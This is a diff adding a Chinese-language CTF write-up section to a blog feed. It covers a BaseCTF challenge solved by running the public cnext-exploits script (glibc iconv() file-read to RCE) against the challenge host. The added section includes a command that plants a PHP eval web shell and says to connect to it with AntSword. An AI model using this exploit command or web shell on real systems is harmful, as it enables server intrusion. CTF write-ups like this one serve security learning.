@@ -1583,6 +1583,53 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;hr&gt;
+&lt;h4 id=&#34;fin-just-readme-前置&#34;&gt;[Fin] Just Readme (前置)
+&lt;/h4&gt;&lt;p&gt;使用这个项目打glibc的iconv()函数将文件读取变成rce&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/ambionics/cnext-exploits&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;将data后改为.text,不然无法正常输出&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240920110616225.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20240920110616225&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;payload&lt;code&gt;python3 cnext-exploit.py http://challenge.basectf.fun:34357/ &amp;quot;echo &#39;&amp;lt;?=@eval(\$_POST[0]);?&amp;gt;&#39; &amp;gt; shell.php&amp;quot;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240920110601171.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20240920110601171&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240920110712772.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20240920110712772&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;蚁剑连接执行文件即可&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240920111821314.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20240920111821314&#34;
+	
+	
+&gt;&lt;/p&gt;
 </description>
         </item>
         <item>
